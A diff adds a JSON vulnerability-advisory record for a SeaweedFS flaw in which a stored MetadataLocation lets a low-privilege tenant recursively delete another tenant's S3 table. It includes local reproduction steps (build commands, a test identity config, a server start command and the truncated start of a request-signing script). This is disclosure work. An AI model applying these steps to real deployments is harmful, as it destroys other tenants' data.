@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-rmcc-687m-xw78",
+  "aliases": [],
+  "title": "S3 Tables MetadataLocation can recursively delete another tenant table",
+  "summary": "# S3 Tables MetadataLocation can recursively delete another tenant's table\n\n## Summary\n\nS3 Tables accepts and stores a caller-selected `MetadataLocation` when creating an authorized table. `DeleteTable` later authorizes only that catalog table, converts the stored location into a same-bucket filer path, and recursively deletes it. A principal restricted to its own decoy table can point that decoy at a victim table in a sibling namespace and make SeaweedFS delete the victim path even though direct victim deletion is denied.\n\n## Impact and affected scope\n\n- **Type:** Broken access control / confused deputy\n- **Affected component:** SeaweedFS S3 Tables create, register, and delete paths\n- **Preconditions:** A low-privilege S3 Tables principal allowed to create and delete one table in a shared table bucket\n- **Verified revision:** `8dcdb70594ae9e9c2ac07aa6d497f38d8c580448` on 27 August 2026\n- **Affected release range:** `<= 4.44`, as entered by the maintainer; patched version not yet specified\n\nThe bounded proof deletes a minimal victim table. `DeleteTable` reaches the same recursive data-deletion sink for populated tables, but the report does not claim a specific production dataset size.\n\n## Technical details\n\nCreate and register paths store `MetadataLocation` without binding it to the authorized namespace/table path. Delete authorization is performed against the requested decoy table, after which the separately stored location becomes the recursive deletion target. Existing same-bucket and ancestor checks do not ensure that the target belongs to the resource that passed authorization.\n\nRelevant code:\n\n- `weed/s3api/s3tables/handler_table.go:105,323,420,462` - accepts and stores table metadata locations.\n- `weed/s3api/s3tables/handler_table.go:1053,1163,1190` - authorizes the named table and initiates deletion.\n- `weed/s3api/s3tables/filer_ops.go:299` and `weed/s3api/s3tables/utils.go:113` - resolve and recursively delete the stored target.\n\n## Reproduction\n\nRun this only on an authorized disposable host with Go 1.26 and Python 3. Build and start the same SeaweedFS mini deployment described below:\n\n```sh\ngit clone https://github.com/seaweedfs/seaweedfs.git\ncd seaweedfs\ngit checkout 8dcdb70594ae9e9c2ac07aa6d497f38d8c580448\ngo build -trimpath -o weed-poc ./weed\nmkdir -p poc-data poc-tmp\n```\n\nSave this as `s3-poc.json`:\n\n```json\n{\n  \"identities\": [\n    {\n      \"name\": \"victim-admin\",\n      \"credentials\": [\n        {\"accessKey\": \"victim-admin\", \"secretKey\": \"victim-secret\"}\n      ],\n      \"actions\": [\"Admin\"]\n    },\n    {\n      \"name\": \"tagger\",\n      \"credentials\": [\n        {\"accessKey\": \"tagger\", \"secretKey\": \"tagger-secret\"}\n      ],\n      \"policyNames\": [\"UnrelatedTagOnly\"]\n    }\n  ],\n  \"policies\": [\n    {\n      \"name\": \"UnrelatedTagOnly\",\n      \"content\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Action\\\":[\\\"s3:PutBucketTagging\\\"],\\\"Resource\\\":[\\\"arn:aws:s3:::unrelated-bucket\\\"]}]}\"\n    }\n  ]\n}\n```\n\nStart the service:\n\n```sh\nTMPDIR=\"$PWD/poc-tmp\" WEED_TELEMETRY=false ./weed-poc mini \\\n  -dir=\"$PWD/poc-data\" \\\n  -ip=127.0.0.1 -ip.bind=127.0.0.1 \\\n  -master.port=19333 -volume.port=19340 -filer.port=18888 \\\n  -s3.port=18333 -s3.port.iceberg=0 -s3.port.lance=0 \\\n  -s3.config=\"$PWD/s3-poc.json\" -metricsPort=19326 \\\n  -webdav=false -admin.ui=false -master.telemetry=false \\\n  -master.volumeSizeLimitMB=64 -volume.preStopSeconds=0 \\\n  >seaweedfs-poc.log 2>&1 &\n```\n\nSave this as `verify_metadata_location.py`:\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport datetime\nimport hashlib\nimport hmac\nimport http.client\nimport json\nimport sys\nimport time\nimport urllib.parse\n\nHOST = \"127.0.0.1\"\nPORT = 18333\nREGION = \"us-east-1\"\n\n\ndef _sign(key: bytes, message: str) -> bytes:\n    return hmac.new(key, message.encode(), hashlib.sha256).digest()\n\n\ndef request(method: str, path: str, query: list[tuple[str, str]] | None = None,\n            body: bytes = b\"\", access: str = \"victim-admin\",...",
+  "published_at": "2026-11-09T19:45:08.000Z",
+  "modified_at": "2026-11-09T19:45:08.000Z",
+  "severity": {
+    "level": "high",
+    "score": 7.2,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "4.44"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-rmcc-687m-xw78",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-rmcc-687m-xw78",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-rmcc-687m-xw78",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:85bcc2b13f178c9a90ea36ee873fad9529e819b984ab894a3a6e7664ca717841",
+  "note": null
+}
